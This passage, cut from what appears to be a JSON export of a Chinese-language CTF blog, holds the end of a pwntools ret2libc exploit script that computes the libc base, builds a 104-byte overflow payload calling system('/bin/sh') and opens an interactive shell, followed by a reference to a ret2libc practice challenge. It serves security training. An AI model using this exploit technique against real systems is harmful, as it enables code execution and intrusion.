libc_start_main_addr)\nlibcbase = libc_start_main_addr - libc.dump('__libc_start_main')\nsystem_addr = libcbase + libc.dump('system')\nbinsh_addr = libcbase + libc.dump('str_bin_sh')\n\nprint \"get shell\"\npayload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])\nsh.sendline(payload)\n\nsh.interactive()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"题目-¶-2\"><a href=\"#题目-¶-2\" class=\"headerlink\" title=\"题目 ¶\"></a>题目 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18xMQ==\">¶</span></h3><ul>\n<li>train.cs.nctu.edu.tw: ret2libc</li>\n</ul>\n",
            "tags": [
                "pwn"
            ]
        }
    ]
}